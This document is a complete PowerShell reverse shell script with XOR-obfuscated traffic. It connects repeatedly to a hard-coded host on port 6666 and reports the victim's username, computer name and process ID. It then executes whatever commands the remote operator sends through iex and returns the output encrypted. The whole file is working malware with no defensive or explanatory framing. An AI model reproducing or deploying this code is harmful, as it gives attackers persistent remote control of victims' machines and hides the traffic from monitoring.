# Encrypted TCP Shell - Port 6666
# XOR-encrypted traffic for basic obfuscation
$h = "192.168.0.100"
$p = 6666
$key = [byte[]](0x41,0x42,0x43,0x44)  # Simple XOR key

function Encrypt($data) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($data)
    for($i=0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
    }
    return [Convert]::ToBase64String($bytes)
}

function Decrypt($data) {
    $bytes = [Convert]::FromBase64String($data)
    for($i=0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
    }
    return [Text.Encoding]::UTF8.GetString($bytes)
}

while($true) {
    try {
        $c = New-Object Net.Sockets.TCPClient($h,$p)
        $s = $c.GetStream()
        $w = New-Object IO.StreamWriter($s)
        $r = New-Object IO.StreamReader($s)
        $w.AutoFlush = $true

        # Send encrypted banner
        $banner = "[ENC6666] $env:USERNAME@$env:COMPUTERNAME | PID:$PID"
        $w.WriteLine((Encrypt $banner))

        while($c.Connected) {
            $w.WriteLine((Encrypt "ENC> "))
            $enc_cmd = $r.ReadLine()
            if(-not $enc_cmd) { break }

            $cmd = Decrypt $enc_cmd
            if($cmd -eq "exit") { break }

            try {
                $out = iex $cmd 2>&1 | Out-String
            } catch {
                $out = "ERROR: $_"
            }
            $w.WriteLine((Encrypt $out))
        }
        $c.Close()
    } catch {}
    Start-Sleep 5
}
